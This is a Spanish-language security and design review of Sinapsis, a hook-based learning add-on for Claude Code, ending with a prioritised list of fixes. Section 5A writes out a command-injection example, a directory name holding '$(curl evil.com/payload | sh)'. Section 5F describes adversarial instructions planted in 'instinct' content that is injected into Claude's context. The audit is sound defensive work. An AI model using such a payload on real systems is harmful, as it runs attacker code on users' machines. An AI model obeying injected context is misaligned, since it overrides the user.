Sinapsis es un proyecto con ideas excepcionales y ejecucion desigual. El Dream Cycle es brillante. El pipeline de observacion es robusto. Pero bugs criticos en el instalador, vulnerabilidades de seguridad y codigo muerto comprometen la fiabilidad en produccion.
2

Arquitectura

Sinapsis se compone de 6 hooks + 1 observer Python que se ejecutan en cada interaccion con Claude Code. Todos son deterministas — no usan LLM.

1 observe.sh + observe_v3.py async Captura cada uso de herramienta en observations.jsonl
2 _project-context.sh sync 3s Inyecta context.md + EOD (1x por sesion)
3 _passive-activator.sh sync 5s Reglas pasivas por patron regex
4 _instinct-activator.sh sync 5s Instincts confirmados/permanentes por matching
5 _session-learner.sh sync Stop Detecta patrones error-fix al cerrar sesion
6 _eod-gather.sh on-demand Recopila actividad multi-proyecto para /eod
7 _dream.sh on-demand Higiene del indice: duplicados, contradicciones, staleness

Pipeline de Aprendizaje

Observe → Learn → Inject → Dream
Metrica clave: ~14 procesos spawneados por cada uso de herramienta (6 blocking + 8 async). El impacto en latencia se detalla en la seccion de Rendimiento.

Lo Que Funciona Bien

1. Dream Cycle _dream.sh — 499 LOC

La pieza mas sofisticada del proyecto

  • Jaccard similarity para detectar duplicados (umbral 0.80)
  • 7 pares de palabras opuestas EN+ES para contradicciones
  • Staleness scoring con auto-archive no destructivo (drafts inactivos >90 dias)
  • Validacion de regex para triggers rotos u overly-broad
  • Health score 0-100 con penalizaciones ponderadas
  • Lock file exclusivo con deteccion de lock obsoleto (>1h)
  • Atomic writes con tmp+rename en indice y report
  • 40 tests (25 unit + 15 E2E) — el unico componente con cobertura

2. Pipeline Determinista

Sin LLM en los hooks = reproducible, rapido, testeable

  • Todos los hooks usan Node.js o Python puro
  • No depende de red, no gasta tokens en el pipeline
  • Siempre produce el mismo resultado con el mismo input
  • Filosofia acertada: el LLM es Claude, los hooks son infraestructura

3. Onboarding y Skill Router

La mejor UX de instalacion del ecosistema Claude Code

  • 8 fases de onboarding guiado
  • 3 modos de arranque: Skills on Demand / Manual / Freestyle
  • Catalogo de skills con estimaciones de tokens (aunque imprecisas — ver Bug #8)

4. observe_v3.py — El unico archivo Python

Bien escrito, con decisiones de diseno defensivas

  • Secret scrubbing con regex (aunque incompleto — ver Seguridad)
  • Auto-archivado de logs a 10MB
  • Deteccion de errores con 9 patrones word-boundary
  • Skip de subagentes y control cooperativo via env vars

5. Modelo Participativo: /analyze → /evolve → /promote

El usuario decide que entra y que no

  • Cada paso es una decision explicita del usuario
  • Reduce ruido vs sistemas automaticos que inyectan sin control
  • Flujo coherente desde la observacion hasta la cristalizacion

Vulnerabilidades de Seguridad

Critico

5A — Command Injection via execSync

execSync con JSON.stringify no previene $(command substitution) en shell. Un atacante podria clonar un repo con un nombre de directorio que contenga $(curl evil.com/payload | sh).

Archivos afectados: _instinct-activator.sh, _project-context.sh, _eod-gather.sh

Fix: Usar execFileSync("git", ["-C", cwd, ...]) que no pasa por shell.

Alto

5B — Secret Scrubbing Incompleto

observe_v3.py:84-88

observe_v3.py solo detecta secrets con labels (api_key, token, etc.). NO detecta:

  • JWTs: eyJ... (header.payload.signature)
  • GitHub tokens: ghp_*, ghs_*
  • AWS keys: AKIA*
  • Connection strings con credenciales embebidas
  • URLs con user:pass@host
Alto

5C — ReDoS en Trigger Patterns

Los instinct triggers son regex editables por el usuario sin validacion de complejidad. Un trigger patologico puede bloquear hooks 5+ segundos por tool use, afectando toda la sesion.

Fix: Timeout por regex con vm.runInNewContext o limite de alternaciones/cuantificadores anidados.

Medio

5D — Sin Permisos Restrictivos en Archivos de Datos

observations.jsonl, _operator-state.json, _instincts-index.json se crean sin chmod restrictivo. Cualquier usuario del sistema puede leerlos (contienen patterns de trabajo, paths de archivos, etc.).

Medio

5E — JSONL Corruption por Appends Concurrentes

Sin flock/locking en Python append. Dos sesiones simultaneas pueden interleave lineas parciales en observations.jsonl, corrompiendo el archivo.

Medio

5F — Prompt Injection via Instinct Content

Los campos inject de instincts se inyectan al contexto de Claude sin sanitizar. Un backup malicioso o un instinct crafteado podria contener instrucciones adversariales.

Lo que Sinapsis NO tiene (y Cortex si)

Contexto: Cortex (fs-cortex) es un sistema paralelo de aprendizaje para Claude Code con un enfoque diferente. Estas son las funcionalidades que Cortex implementa y que Sinapsis v4.3 no tiene. Cada una representa una oportunidad de mejora.
GAP CRITICO

1. Secret Scrubbing Superior (5 patrones vs 1)

Cortex tiene 5 capas de scrubbing en su observe.sh:

# Cortex observe.sh — 5 patrones independientes SECRET_RE — API keys, tokens, passwords, credentials (con delimitadores) JWT_RE — JWT tokens (patron eyJ...) PEM_RE — Certificados PEM (-----BEGIN...-----) SSH_RE — SSH keys (ssh-rsa, ssh-ed25519...) AWS_RE — AWS Access Keys (patron AKIA...)

Sinapsis observe_v3.py solo tiene 1 patron que requiere un label contextual (api_key, token, etc.). No detecta JWTs sueltos, claves AWS, certificados PEM ni SSH keys.

Impacto: Secrets sensibles pueden quedar grabados en observations.jsonl sin redactar.

GAP IMPORTANTE

2. Sistema de Confianza Continua (0.0-1.0)

Cortex usa un rango numerico continuo 0.0-1.0 con 5 etapas semanticas:

EtapaConfianzaComportamiento
Observacion0.0-0.3Raw, no se inyecta
Hipotesis0.3-0.5Vista 2+ veces, aplica si relevante
Patron0.5-0.73+ ocurrencias, alta probabilidad
Instinct0.7-0.9Validado, auto-aplicado
Law0.9-1.0Multi-proyecto, siempre aplicado

Sinapsis usa 3 niveles discretos sin acumulacion: draft / confirmed / permanent. Un instinct no sabe cuantas veces se ha observado su patron. No hay transiciones automaticas basadas en evidencia acumulada (el auto-promote esta roto).

Impacto: No se puede medir la madurez real de un instinct ni decidir automaticamente cuando es fiable.

GAP IMPORTANTE

3. Laws — Conocimiento Destilado (one-liners inyectados siempre)

Cortex tiene un tercer nivel por encima de instincts: Laws. Son reglas de una linea (≤120 chars) que se inyectan automaticamente al inicio de CADA sesion via hook SessionStart.

# Ejemplo de Laws activas en Cortex (max 10, ~300 tokens total): applypatch-over-edit — Prefer ApplyPatch over Edit for changes of 5+ lines git-triple-check — Before commits/branches/PRs: git status + diff + log grep-then-read-verify — Grep to find files, then Read to verify context mobile-first-no-hover-only — NEVER opacity-0 on action buttons; use opacity-60 parallel-reads-for-context — Read multiple files in parallel (batch tool calls)

Sinapsis no tiene el concepto de Laws. Todo es instinct (se inyecta condicionalmente por regex match en PreToolUse). No hay forma de decir "esta regla aplica SIEMPRE, sin condicion".

Impacto: Las lecciones mas universales (git workflow, patrones de lectura, seguridad basica) no tienen un mecanismo de inyeccion incondicional. El passive-rules.json se acerca pero no tiene el ciclo de vida (no se graduan desde instincts).

GAP IMPORTANTE

4. Temporal Decay — Degradacion de Confianza

Cortex aplica -0.1 de confianza cada 60 dias a instincts que no se activan. Si un instinct cae por debajo de 0.30, se archiva automaticamente.

Sinapsis tiene staleness scoring en el Dream Cycle (fresh/stale/archive_candidate), pero solo corre bajo demanda cuando el usuario ejecuta /dream. No hay degradacion automatica continua. Un instinct obsoleto puede estar inyectandose durante meses sin que nadie lo note.

Impacto: Sin decay automatico, el indice de instincts crece indefinidamente y los instincts obsoletos contaminan el contexto.

GAP MODERADO

5. Sub-agentes Especializados

Cortex tiene 3 agentes especializados:

  • cortex-observer (Opus 1M): Analiza observaciones, detecta patrones con clustering 4D, propone instincts con evidencia
  • cortex-planner (Sonnet): Descompone tareas complejas en pasos
  • cortex-reviewer (Sonnet ×3 paralelo): Code review con 3 perspectivas simultaneas

Sinapsis no tiene sub-agentes. Todo el analisis se hace con Node.js determinista en _session-learner.sh (bueno para coste 0, pero limitado a patrones simples como error→fix en ventana de 5 eventos).

Impacto: El analisis de patrones complejos (correcciones del usuario, preferencias de estilo, workflows repetidos) requiere capacidad semantica que el pipeline determinista no puede ofrecer.

GAP MODERADO

6. Backup y Restore Portables

Cortex tiene /cx-backup que genera un .tar.gz portable con todo el conocimiento (instincts, laws, reflexes, memory.json, observaciones) y /cx-restore que importa y hace merge inteligente con datos existentes (no sobreescribe, fusiona).

Sinapsis no tiene backup ni restore. La unica forma de transferir conocimiento es copiar manualmente los archivos de ~/.claude/skills/. Peor aun: el install.sh actual DESTRUYE los instincts al hacer upgrade (bug #1).

Impacto: No hay forma segura de migrar conocimiento entre maquinas ni de recuperarse de un upgrade destructivo.

GAP MODERADO

7. EOD Resume Auto-inyectado

Cortex inyecta automaticamente un Quick Resume al inicio de cada sesion via hook SessionStart: "Ayer trabajaste en X, Y, Z. Prioridades: A, B, C." Esto funciona como un puente de contexto entre dias.

Sinapsis tiene _project-context.sh que inyecta context.md + EOD, pero el EOD hay que generarlo manualmente con /eod. Si el usuario olvida ejecutarlo, no hay resumen al dia siguiente. Cortex lo genera y lo inyecta automaticamente.

GAP MODERADO

8. Reflexes con Contadores de Disparo

Cortex tiene reflexes.json con 11 reflexes que incluyen fireCount y lastFired. Son como passive rules pero con tracking real de uso: puedes ver cuantas veces se ha disparado cada reflex y cuando fue la ultima vez.

Sinapsis tiene passive rules (_passive-rules.json) pero sin tracking de uso. El archivo no tiene campos fireCount ni lastFired (de hecho, /passive-status intenta mostrarlos pero no existen en el JSON — bug #11).

GAP MENOR

9. Sampling 1/3 para Herramientas Ruidosas

Cortex aplica sampling 1/3 para Read, Glob y Grep — herramientas que se usan masivamente y generan mucho ruido en las observaciones. Solo 1 de cada 3 invocaciones se graba.

Sinapsis graba TODAS las invocaciones sin excepcion. Esto genera archivos de observacion mas grandes y con mas ruido, lo que dificulta el analisis de patrones utiles.

GAP MENOR

10. Promocion Semantica con Jaccard

Cortex usa Jaccard similarity ≥ 0.70 + presencia en 2+ proyectos + confianza promedio ≥ 0.80 para decidir si un instinct de proyecto se promueve a global. Es una decision basada en datos.

Sinapsis tiene /promote pero es completamente manual — el usuario decide sin metricas. No hay Jaccard cross-proyecto, no hay umbral de confianza, no hay requisito de presencia en multiples proyectos.

Mejoras Propuestas

P1

7.1 — Fix Installer para Upgrades

Cambiar cp a cp -n (o if [ ! -f ]) para _instincts-index.json, _passive-rules.json y _projects.json. Misma logica que ya aplica para _operator-state.json (linea 121).

Beneficio: Los upgrades dejan de destruir datos aprendidos.

P1

7.2 — Cache de Git en Hot Path

Cache del project hash en /tmp/sinapsis-project-{cwd_hash} con TTL de sesion. Elimina 2 git spawns en cada tool use del _instinct-activator.sh.

Ahorro estimado: ~200ms por tool use × 200 = ~40 segundos por sesion.

P1

7.3 — Fix Command Injection

Reemplazar todos los execSync("git -C " + JSON.stringify(...)) con execFileSync("git", ["-C", cwd, ...]). 3 archivos afectados, cambio mecanico.

P2

7.4 — Arreglar Auto-Promote

Mover el filtro de drafts (linea 74) DESPUES del matching, o crear un path separado para drafts que solo incrementa ocurrencias sin inyectar contenido. Asi los drafts acumulan evidencia y se promueven organicamente.

P2

7.5 — Consolidar Observador a Single Process

Actualmente: bash → python → git × 2 = 4 procesos. Propuesta: single Python script que haga todo inline = 1 proceso. Ahorro: ~300ms por invocacion × 2 (pre+post) = ~600ms por tool use.

P2

7.6 — Ampliar Secret Scrubbing

Agregar patrones para: JWT (eyJ[A-Za-z0-9_-]{10,}\.), GitHub (gh[ps]_[A-Za-z0-9]{36}), AWS (AKIA[A-Z0-9]{16}), connection strings. 4 regex adicionales.

P2

7.7 — Fix Token Catalog

Medir tokens reales de cada skill con aproximacion chars/4. Actualizar _catalog.json con cifras correctas (~9,700 vs 2,700 declarados).

P3

7.8 — Sincronizar install.bat

Actualizar a v4.3.0, agregar _eod-gather.sh y _dream.sh, corregir conteo de hooks (4 → 6).

P3

7.9 — Extraer JS Inline a Archivos Separados

~1,100 LOC de JavaScript embebido en bash via node -e '...' → archivos .js independientes. Beneficio: linting, testing, debugging, syntax highlighting, sourcemaps.

P3

7.10 — Tests para Todos los Hooks

Actualmente solo Dream Cycle tiene tests (40). Faltan: observe_v3.py, _instinct-activator, _session-learner, _passive-activator, _project-context. Patron a seguir: bash tests con mktemp sandboxes (ya usado en test-dream.sh).

P3

7.11 — CI Pipeline

GitHub Actions para ejecutar los 40+ tests en cada push/PR. Linting basico de bash (shellcheck) y JS (node --check).

P3

7.12 — Unicode en Jaccard

Cambiar regex tokenizer en Dream Cycle a [^\p{L}\p{N} ]/gu para soportar todos los alfabetos (CJK, Cyrillic, Arabic, etc.).
